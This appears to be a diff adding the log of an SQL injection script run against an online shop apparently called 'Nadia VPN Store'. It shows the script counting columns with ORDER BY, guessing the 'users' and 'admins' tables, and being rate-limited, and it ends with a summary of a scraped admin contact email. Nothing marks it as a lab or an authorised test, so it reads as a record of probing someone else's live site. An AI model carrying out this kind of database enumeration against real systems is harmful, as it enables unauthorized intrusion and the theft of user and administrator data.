@@ -1,0 +1,17 @@
+[*] Step 1: Getting number of columns...
+  Error at ORDER BY 1, columns = 0
+  Default: 8 columns
+
+[*] Step 2: Querying tables with 8 columns...
+  Response: globalLoading = false, 60000); }"> Nadia VPN Store window.serverToasts = [ { id: Date.now() + 5, message: "The email field must be a valid email address.", type: 'error' }, ]; tailwind.config = { darkMode: 'class', theme: { extend: { colors: { slate: { 750: '#293548', 850: '#151f32', 950: '#0b0f19', } } } } }; document.addEventListener('alpine:init', () => { if (!Alpine.data('appState')) { Alpine.data('appState', () => ({ darkMode: document.documentElement.classList.contains('dark'), globalLoading: false, toasts: window.serverToasts || [], init() { window.addEventListener('theme-changed', (e) 
+
+[*] Step 3: Trying common table names...
+  [users] globalLoading = false, 60000); }"> Nadia VPN Store window.serverToasts = [ { id: Date.now() + 5, message: "The email field must be a valid email addre
+  [admins] globalLoading = false, 60000); }"> Nadia VPN Store window.serverToasts = [ { id: Date.now() + 5, message: "The email field must be a valid email addre
+
+[*] Step 4: Getting database info...
+  Error: HTTP Error 429: Too Many Requests
+
+=== SUMMARY ===
+Email admin: nama@email.com (dari halaman /contact)
+File: /tmp/sqli_tables.html
